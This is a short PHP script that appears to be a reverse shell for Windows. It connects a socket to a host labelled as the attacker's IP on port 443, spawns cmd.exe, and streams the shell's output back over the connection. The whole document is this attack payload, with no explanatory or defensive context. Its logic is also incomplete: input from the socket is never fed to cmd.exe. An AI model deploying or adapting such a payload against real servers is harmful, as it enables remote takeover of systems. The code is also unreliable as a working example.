<?php
$ip = '127.0.0.1';  // Attacker's IP address
$port = 443;     // Attacker's listening port

// Create a socket and connect to the attacker's machine
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
    die("Could not create socket: " . socket_strerror(socket_last_error()));
}

if (socket_connect($sock, $ip, $port) === false) {
    die("Could not connect: " . socket_strerror(socket_last_error($sock)));
}

// Define the command to be executed (cmd.exe for Windows)
$cmd = "cmd.exe";

// Use pipes to handle stdin, stdout, and stderr
$descriptorspec = [
    0 => ["pipe", "r"],  // stdin
    1 => ["pipe", "w"],  // stdout
    2 => ["pipe", "w"]   // stderr
];

// Open the process with cmd.exe
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    // Handle the communication with cmd.exe
    while (!feof($pipes[1])) {
        // Read output from cmd.exe and send it over the socket
        $output = fread($pipes[1], 1024);
        socket_write($sock, $output, strlen($output));
    }

    // Close the pipes
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);

    // Close the process
    proc_close($process);
}

// Close the socket
socket_close($sock);
?>
